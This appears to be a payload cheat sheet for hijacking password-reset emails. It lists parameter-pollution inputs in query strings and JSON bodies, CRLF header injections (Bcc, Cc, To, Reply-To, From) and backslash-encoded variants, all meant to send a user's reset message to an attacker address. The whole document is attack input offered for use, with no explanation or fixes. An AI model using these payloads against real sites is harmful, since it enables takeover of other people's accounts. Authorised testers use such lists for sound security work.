# Payloads

### Query/Form-Based Parameter Payloads
```
email=user@dot.com&email=attacker@dot.com
email=user@dot.com%26email=attacker@dot.com
email=user@dot.com;email=attacker@dot.com
email[]=user@dot.com&email[]=attacker@dot.com
email=user@dot.com,attacker@dot.com
email=user@dot.com%2Cattacker@dot.com
email=user@dot.com%3Battacker@dot.com
email=user@dot.com%0Attacker@dot.com
email=user@dot.com%0D%0AAttacker@dot.com
email=user@dot.com%250Aattacker@dot.com
```

### JSON-Based Parameter Payloads
```
{"email": "user@dot.com", "email": "attacker@dot.com"}
{"email": ["user@dot.com", "attacker@dot.com"]}
{"email": ["user@dot.com"], "email": ["attacker@dot.com"]}
{"email": "user@dot.com,attacker@dot.com"}
{"emails": ["user@dot.com", "attacker@dot.com"]}
{"email[]": ["user@dot.com", "attacker@dot.com"]}
{"recipient": ["user@dot.com", "attacker@dot.com"]}
{"reset": {"email": ["user@dot.com", "attacker@dot.com"]}}
{"email": ["user@dot.com"], "bcc": ["attacker@dot.com"]}
{"email": ["user@dot.com"], "extra": ["attacker@dot.com"]}
```

### CRLF Injection in Email Headers
```
email=user@dot.com%0D%0ABcc:attacker@dot.com
email=user@dot.com%0ABcc:attacker@dot.com
email=user@dot.com%0DBcc:attacker@dot.com
email=user@dot.com%0D%0ATo:attacker@dot.com
email=user@dot.com%0D%0AInjected: yes
email=user@dot.com%0D%0ASubject: Reset Hijacked
email=user@dot.com%0D%0AReply-To: attacker@dot.com
email=user@dot.com%0D%0AFrom: attacker@dot.com
email=user@dot.com%0D%0AReturn-Path: attacker@dot.com
email=user@dot.com%0D%0ACc: attacker@dot.com
```

### Backslash-Encoded Variants
```
email=user@dot.com\rBcc:attacker@dot.com
email=user@dot.com\nBcc:attacker@dot.com
email=user@dot.com\r\nBcc:attacker@dot.com
email=user@dot.com\\r\\nBcc:attacker@dot.com
email=user@dot.com\\nBcc:attacker@dot.com
email=user@dot.com\\rBcc:attacker@dot.com
email=user@dot.com\r\nCc:attacker@dot.com
email=user@dot.com\r\nTo:attacker@dot.com
email=user@dot.com\r\nReply-To:attacker@dot.com
email=user@dot.com\r\nHeader-Injection: Success
```
